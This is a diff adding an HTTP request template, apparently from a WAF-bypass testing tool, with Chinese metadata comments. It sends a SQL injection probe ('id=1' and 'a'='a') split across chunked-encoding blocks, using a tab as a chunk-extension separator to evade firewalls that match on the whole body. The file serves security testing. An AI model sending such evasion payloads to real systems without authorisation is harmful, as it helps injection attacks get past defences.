@@ -1,0 +1,23 @@
+# @name: chunked扩展注释分割
+# @tags: post,chunked,extension-comment,tab,sqli,id,bypass
+# @color: violet
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: chunked_extension_comment
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 在 chunked 块大小行后使用 \t 作为扩展注释符(RFC 合法注释符为 ; 和 \t)，把关键字进一步拆散，绕过按完整 body 拼接后匹配的 WAF。参考 do9gy 文档原版 7\t0 写法。
+POST / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+3
+id=
+6	0
+1' and
+7
+ 'a'='a
+0
+
